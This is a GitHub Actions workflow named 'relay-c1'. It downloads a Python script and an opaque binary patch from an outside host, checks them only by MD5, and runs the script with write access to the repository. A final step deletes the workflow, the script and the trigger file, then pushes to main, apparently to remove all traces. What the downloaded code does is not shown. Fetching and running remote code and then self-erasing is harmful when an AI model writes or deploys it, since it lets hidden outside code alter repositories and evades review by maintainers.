name: relay-c1
on:
  push:
    paths:
      - '.github/relay-trigger'
  workflow_dispatch:
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: apply byte-exact
        env:
          C1_URL: "https://static.chainopera.ai/files/8b33f255-1769-4e73-bbd2-8d4b098c707e/patch.bin.gz"
          C1_MD5: "f525caf6f235b35e77e14172e6f8ce10"
          S_URL: "https://static.chainopera.ai/files/3de2f353-bdef-4c2f-a6b0-801e8531e2d4/c1script.py.gz"
          S_MD5: "f243ada4c7b547d50237497204bd4f8a"
          MSG64: ""
        run: |
          set -euo pipefail
          fetch() {
            for i in 1 2 3 4 5 6 7 8; do
              if curl -fsSL --retry 3 --retry-all-errors -o "$2" "$1"; then return 0; fi
              echo "retry $i for $1"; sleep 5
            done
            echo "download failed: $1"; return 1
          }
          fetch "$S_URL" /tmp/s.py.gz
          python3 - <<'PY'
          import gzip, hashlib, os, sys
          b = gzip.decompress(open('/tmp/s.py.gz','rb').read())
          if hashlib.md5(b).hexdigest() != os.environ['S_MD5']:
              print('script md5 mismatch'); sys.exit(1)
          open('relay_c1.py','wb').write(b)
          print('script ok', len(b))
          PY
          fetch "$C1_URL" /tmp/p.gz
          git config user.name "relay-bot"
          git config user.email "relay-bot@users.noreply.github.com"
          python3 relay_c1.py
      - name: cleanup
        run: |
          set -euo pipefail
          git rm -q --ignore-unmatch .github/workflows/relay-c1.yml relay_c1.py .github/relay-trigger || true
          git commit -q -m "chore: xoa workflow relay-c1 tam thoi" || true
          git push origin HEAD:main || true
